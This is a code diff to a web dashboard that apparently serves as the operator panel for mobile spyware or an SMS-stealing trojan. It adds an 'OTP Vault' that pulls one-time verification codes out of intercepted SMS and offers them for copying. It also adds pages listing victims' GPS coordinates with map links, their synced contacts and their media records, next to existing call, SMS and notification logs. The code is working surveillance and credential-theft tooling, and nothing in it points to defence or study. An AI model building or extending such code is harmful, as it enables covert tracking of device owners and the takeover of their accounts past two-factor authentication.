@@ -453,9 +453,27 @@
       <span class="nav-icon">💬</span> SMS
       <span class="nav-badge" id="badge-sms">0</span>
     </div>
+    <div class="nav-item" onclick="showPage('otp')">
+      <span class="nav-icon">🔐</span> OTP Vault
+      <span class="nav-badge" id="badge-otp">0</span>
+    </div>
     <div class="nav-item" onclick="showPage('notifications')">
       <span class="nav-icon">🔔</span> Notifications
       <span class="nav-badge" id="badge-notif">0</span>
+    </div>
+
+    <div class="nav-section">Device Data</div>
+    <div class="nav-item" onclick="showPage('location')">
+      <span class="nav-icon">🗺️</span> Location GPS
+      <span class="nav-badge" id="badge-location">0</span>
+    </div>
+    <div class="nav-item" onclick="showPage('contacts')">
+      <span class="nav-icon">📇</span> Contacts
+      <span class="nav-badge" id="badge-contacts">0</span>
+    </div>
+    <div class="nav-item" onclick="showPage('media')">
+      <span class="nav-icon">📸</span> Media Assets
+      <span class="nav-badge" id="badge-media">0</span>
     </div>
 
     <div class="nav-section">Tools</div>
@@ -677,6 +695,67 @@
       </div>
     </div>
 
+    <!-- ── OTP VAULT PAGE ───────────────────────────── -->
+    <div class="page" id="page-otp">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Device</th><th>Sender</th><th>Extracted Code</th><th>Full Message</th><th>Time</th></tr>
+          </thead>
+          <tbody id="otp-body">
+            <tr><td colspan="5"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── LOCATION PAGE ────────────────────────────── -->
+    <div class="page" id="page-location">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Action Map</th><th>Time</th></tr>
+          </thead>
+          <tbody id="location-body">
+            <tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── CONTACTS PAGE ────────────────────────────── -->
+    <div class="page" id="page-contacts">
+      <div class="search-bar">
+        <input class="search-input" id="contact-search" type="text"
+          placeholder="Filter contacts by name or phone..."
+          oninput="filterContactsList()" />
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Name</th><th>Phone Number</th><th>Device</th><th>Synced At</th></tr>
+          </thead>
+          <tbody id="contacts-body">
+            <tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── MEDIA ASSETS PAGE ────────────────────────── -->
+    <div class="page" id="page-media">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Asset ID</th><th>Type</th><th>Resolution</th><th>Duration</th><th>Device</th><th>Time</th></tr>
+          </thead>
+          <tbody id="media-body">
+            <tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
     <!-- ── SEARCH PAGE ────────────────────────────── -->
     <div class="page" id="page-search">
       <div class="search-bar">
@@ -806,12 +885,13 @@ function showError(msg) {
 function showPage(name) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-  document.getElementById(`page-${name}`).classList.add('active');
+  document.getElementById(`page-${name}`)?.classList.add('active');
   document.querySelector(`.nav-item[onclick="showPage('${name}')"]`)?.classList.add('active');
   document.getElementById('page-title').textContent =
     { dashboard:'Dashboard', devices:'Devices', calls:'Call Logs',
-      sms:'SMS Logs', notifications:'Notifications', search:'Search',
-      gallery:'Gallery' }[name] || name;
+      sms:'SMS Logs', otp:'OTP Vault', notifications:'Notifications Log',
+      location:'GPS Location Tracker', contacts:'Contacts Directory',
+      media:'Media Assets', search:'Search', gallery:'Gallery' }[name] || name;
   currentPage = name;
   loadPage(name);
 }
@@ -823,7 +903,11 @@ function loadPage(name) {
   else if (name === 'devices') loadDevices();
   else if (name === 'calls') loadCalls();
   else if (name === 'sms') loadSms();
+  else if (name === 'otp') loadOtp();
   else if (name === 'notifications') loadNotifications();
+  else if (name === 'location') loadLocation();
+  else if (name === 'contacts') loadContacts();
+  else if (name === 'media') loadMediaSummary();
   else if (name === 'gallery') loadGallery();
 }
 
@@ -858,8 +942,11 @@ async function populateDeviceDropdown() {
 function loadAll() {
   populateDeviceDropdown();
   loadDashboard();
-  // Pre-load gallery badge count
+  // Pre-load badge counts
   api('/api/gallery?limit=1').then(r => setBadge('badge-gallery', r.total || 0)).catch(()=>{});
+  api('/api/location').then(r => setBadge('badge-location', r.count || 0)).catch(()=>{});
+  api('/api/contacts').then(r => setBadge('badge-contacts', r.count || 0)).catch(()=>{});
+  api('/api/media-summary').then(r => setBadge('badge-media', r.count || 0)).catch(()=>{});
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -1134,6 +1221,171 @@ async function loadNotifications() {
     renderPagination('notif-pagination', pages.notifications, r.total, 50, p => { pages.notifications=p; loadNotifications(); });
   } catch (e) {
     tbody.innerHTML = `<tr><td colspan="5"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  OTP Vault
+// ─────────────────────────────────────────────────────────────
+async function loadOtp() {
+  const tbody = document.getElementById('otp-body');
+  tbody.innerHTML = '<tr><td colspan="5"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({ page: 1, limit: 100 });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/events/sms?${qs}`);
+    const otps = (r.data || []).filter(item => {
+      const b = (item.body || '').toUpperCase();
+      return b.includes('OTP') || b.includes('VERIFICATION') || b.includes('CODE');
+    });
+
+    setBadge('badge-otp', otps.length);
+
+    if (!otps.length) {
+      tbody.innerHTML = '<tr><td colspan="5"><div class="empty"><div class="empty-icon">🔐</div>No OTPs found</div></td></tr>';
+      return;
+    }
+
+    tbody.innerHTML = otps.map(e => {
+      const match = (e.body || '').match(/\b\d{4,8}\b/);
+      const code = match ? match[0] : '—';
+      return `
+        <tr>
+          <td class="mono" style="font-size:11px">${(e.device_name||e.device_id).slice(0,18)}</td>
+          <td>${esc(e.title)}</td>
+          <td>
+            <span class="badge badge-sms" style="font-size:14px;letter-spacing:2px">${code}</span>
+            ${code !== '—' ? `<button class="btn-refresh" style="padding:2px 8px;font-size:10px;margin-left:6px" onclick="navigator.clipboard.writeText('${code}');alert('Copied OTP ${code}')">Copy</button>` : ''}
+          </td>
+          <td class="ellipsis" style="max-width:300px">${esc(e.body)}</td>
+          <td class="mono">${fmt(e.timestamp)}</td>
+        </tr>`;
+    }).join('');
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="5"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Location GPS
+// ─────────────────────────────────────────────────────────────
+async function loadLocation() {
+  const tbody = document.getElementById('location-body');
+  tbody.innerHTML = '<tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({});
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/location?${qs}`);
+
+    setBadge('badge-location', r.count || 0);
+
+    if (!r.data || !r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><div class="empty-icon">🗺️</div>No Location GPS events recorded yet</div></td></tr>';
+      return;
+    }
+
+    tbody.innerHTML = r.data.map(e => {
+      const loc = e.location || {};
+      const lat = loc.latitude !== undefined ? loc.latitude : '—';
+      const lng = loc.longitude !== undefined ? loc.longitude : '—';
+      const acc = loc.accuracy !== undefined ? `±${loc.accuracy.toFixed(1)}m` : '—';
+      const mapUrl = (lat !== '—' && lng !== '—') ? `https://www.google.com/maps?q=${lat},${lng}` : '#';
+
+      return `
+        <tr>
+          <td class="mono" style="font-size:11px">${(e.device_name||e.device_id).slice(0,18)}</td>
+          <td class="mono" style="font-weight:700;color:var(--accent)">${lat}</td>
+          <td class="mono" style="font-weight:700;color:var(--accent)">${lng}</td>
+          <td class="mono">${acc}</td>
+          <td>
+            ${mapUrl !== '#' ? `<a href="${mapUrl}" target="_blank" class="badge badge-online" style="text-decoration:none">📍 Open Google Maps</a>` : '—'}
+          </td>
+          <td class="mono">${fmt(e.timestamp)}</td>
+        </tr>`;
+    }).join('');
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="6"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Contacts Directory
+// ─────────────────────────────────────────────────────────────
+let _allContactsList = [];
+
+async function loadContacts() {
+  const tbody = document.getElementById('contacts-body');
+  tbody.innerHTML = '<tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({});
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/contacts?${qs}`);
+
+    _allContactsList = r.data || [];
+    setBadge('badge-contacts', _allContactsList.length);
+
+    renderContactsList(_allContactsList);
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="4"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+function filterContactsList() {
+  const q = (document.getElementById('contact-search')?.value || '').toLowerCase();
+  const filtered = _allContactsList.filter(c => 
+    (c.name || '').toLowerCase().includes(q) || (c.phone || '').toLowerCase().includes(q)
+  );
+  renderContactsList(filtered);
+}
+
+function renderContactsList(list) {
+  const tbody = document.getElementById('contacts-body');
+  if (!list.length) {
+    tbody.innerHTML = '<tr><td colspan="4"><div class="empty"><div class="empty-icon">📇</div>No contacts found</div></td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = list.map(c => `
+    <tr>
+      <td style="font-weight:700">${esc(c.name)}</td>
+      <td class="mono" style="color:var(--green)">
+        📞 ${esc(c.phone)}
+        <button class="btn-refresh" style="padding:2px 8px;font-size:10px;margin-left:8px" onclick="navigator.clipboard.writeText('${esc(c.phone)}');alert('Copied ${esc(c.phone)}')">Copy</button>
+      </td>
+      <td class="mono" style="font-size:11px">${(c.device_name||c.device_id||'').slice(0,18)}</td>
+      <td class="mono">${fmt(c.synced_at)}</td>
+    </tr>`).join('');
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Media Assets Summary
+// ─────────────────────────────────────────────────────────────
+async function loadMediaSummary() {
+  const tbody = document.getElementById('media-body');
+  tbody.innerHTML = '<tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({});
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/media-summary?${qs}`);
+
+    setBadge('badge-media', r.count || 0);
+
+    if (!r.data || !r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><div class="empty-icon">📸</div>No media asset summaries recorded yet</div></td></tr>';
+      return;
+    }
+
+    tbody.innerHTML = r.data.map(m => `
+      <tr>
+        <td class="mono" style="font-size:11px">Asset #${m.id}</td>
+        <td><span class="badge ${m.type==='video'?'badge-call':'badge-sms'}">${m.type}</span></td>
+        <td class="mono">${m.width}×${m.height}</td>
+        <td class="mono">${m.duration ? m.duration+'s' : 'N/A'}</td>
+        <td class="mono" style="font-size:11px">${(m.device_name||m.device_id||'').slice(0,18)}</td>
+        <td class="mono">${fmt(m.synced_at)}</td>
+      </tr>`).join('');
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="6"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
   }
 }
 
